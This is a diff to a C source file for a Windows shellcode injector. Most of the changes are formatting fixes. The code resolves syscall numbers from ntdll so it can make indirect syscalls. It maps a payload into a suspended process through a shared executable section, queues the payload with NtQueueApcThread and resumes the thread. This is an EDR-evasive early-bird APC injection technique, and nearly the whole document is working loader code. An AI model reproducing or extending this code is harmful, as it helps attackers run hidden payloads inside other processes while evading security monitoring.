@@ -18,7 +18,7 @@ DWORD NtWaitForSingleObjectSSN;
 DWORD NtCloseSSN;
 DWORD NtCreateSectionSSN;
 DWORD NtMapViewOfSectionSSN;
-DWORD RtlCreateUserThreadSSN; 
+DWORD RtlCreateUserThreadSSN;
 DWORD NtResumeThreadSSN;
 DWORD NtQueueApcThreadSSN;
 DWORD NtCreateProcessExSSN;
@@ -121,20 +121,20 @@ void Janitor(IN HANDLE hProcThread) {
 
 
 
-BOOL RemoteMappingInjector( IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+BOOL RemoteMappingInjector(IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
 
 
     BOOL bSTATE = TRUE;
     DWORD dwPID;
     HANDLE   hSection = NULL;
-    PVOID    pLocalAddress  = NULL,
-	     pRemoteAddress = NULL;
+    PVOID    pLocalAddress = NULL,
+        pRemoteAddress = NULL;
     NTSTATUS STATUS = NULL;
-    SIZE_T   sViewSize	= NULL;
-    LARGE_INTEGER MaximumSize 		= {
-			.HighPart = 0,
-			.LowPart = sPayloadSize
-	};
+    SIZE_T   sViewSize = NULL;
+    LARGE_INTEGER MaximumSize = {
+            .HighPart = 0,
+            .LowPart = sPayloadSize
+    };
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
 
@@ -144,17 +144,17 @@ BOOL RemoteMappingInjector( IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
     HANDLE				hThread = pi.hThread;
     HANDLE              hProcess = pi.hProcess;
 
-   
+
     STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     if (STATUS != STATUS_SUCCESS) {
-        info("NtCreateSection Failed With Error : %d \n", STATUS));
+        info("NtCreateSection Failed With Error : %d \n", STATUS);
         bSTATE = FALSE;
         return;
     }
     STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READWRITE);
     if (STATUS != STATUS_SUCCESS) {
         info("MapViewOfFile Failed With Error : %d \n", STATUS);
-        bSTATE = FALSE; 
+        bSTATE = FALSE;
         return;
     }
 
@@ -162,31 +162,31 @@ BOOL RemoteMappingInjector( IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
     memcpy(pLocalAddress, pPayload, sPayloadSize);
 
     // Maps the payload to a new remote buffer in the target process
-   STATUS = NtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
-   if (STATUS != STATUS_SUCCESS) {
-       info("NtMapViewOfSection Failed With Error : %d \n", STATUS);
-       bSTATE = FALSE;
-       return;
-   }
-   PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pRemoteAddress;
-   STATUS = NtQueueApcThread(hThread,(PAPCFUNC)apcRoutine, NULL);
-   if (STATUS != STATUS_SUCCESS) {
-       info("NtQueueApcThread Failed With Error : %d \n", STATUS);
-       bSTATE = FALSE;
-       return;
-   }
-   
-   STATUS = NtResumeThread(pi.hThread);
-   if (STATUS != STATUS_SUCCESS) {
-       info("NtResumeThread Failed With Error : %d \n", STATUS);
-       bSTATE = FALSE;
-       return;
-   }
+    STATUS = NtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
+    if (STATUS != STATUS_SUCCESS) {
+        info("NtMapViewOfSection Failed With Error : %d \n", STATUS);
+        bSTATE = FALSE;
+        return;
+    }
+    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pRemoteAddress;
+    STATUS = NtQueueApcThread(hThread, (PAPCFUNC)apcRoutine, NULL);
+    if (STATUS != STATUS_SUCCESS) {
+        info("NtQueueApcThread Failed With Error : %d \n", STATUS);
+        bSTATE = FALSE;
+        return;
+    }
 
-   Janitor(hThread);
-   Janitor(hProcess);
+    STATUS = NtResumeThread(pi.hThread);
+    if (STATUS != STATUS_SUCCESS) {
+        info("NtResumeThread Failed With Error : %d \n", STATUS);
+        bSTATE = FALSE;
+        return;
+    }
 
-   return bSTATE;
+    Janitor(hThread);
+    Janitor(hProcess);
+
+    return bSTATE;
 }
 
 
@@ -205,12 +205,12 @@ void ResolverPrelude() {
     NtCallResolver(hNTDLL, "NtResumeThread", &NtResumeThreadSSN, &NtResumeThreadSyscall);
     NtCallResolver(hNTDLL, "NtQueueApcThread", &NtQueueApcThreadSSN, &NtQueueApcThreadSyscall);
     NtCallResolver(hNTDLL, "NtCreateProcessEx", &NtCreateProcessExSSN, &NtCreateProcessExSyscall);
-    
-   
+
+
 }
 
 int main(int argc, char* argv[]) {
-   
+
     ResolverPrelude();
 
     warn("Indirect Syscalls Obtained, beginning injection!!");
@@ -248,9 +248,6 @@ int main(int argc, char* argv[]) {
         return EXIT_FAILURE;
     };
 
-    
+
     return 0;
 }
-
-
-
